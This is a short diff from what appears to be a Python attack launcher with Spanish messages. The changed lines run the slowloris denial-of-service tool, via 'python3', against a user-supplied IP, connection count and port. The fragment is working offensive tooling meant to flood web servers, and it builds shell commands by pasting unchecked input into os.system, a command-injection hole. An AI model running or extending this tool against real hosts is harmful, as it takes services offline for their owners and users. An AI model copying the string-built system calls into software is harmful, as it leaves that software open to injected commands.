@@ -103,11 +103,11 @@ elif method == "2":
     else:
         if port == "":
             print("Iniciando conexiones...")
-            system("slowloris "+ip+" -s "+HTTP_conexion+" -p 80")
+            system("python3 slowloris "+ip+" -s "+HTTP_conexion+" -p 80")
         
         else:
             print("Iniciando conexiones...")
-            system("slowloris "+ip+" -s "+HTTP_conexion+" -p "+port)
+            system("python3 slowloris "+ip+" -s "+HTTP_conexion+" -p "+port)
             
             
 elif method == "3":
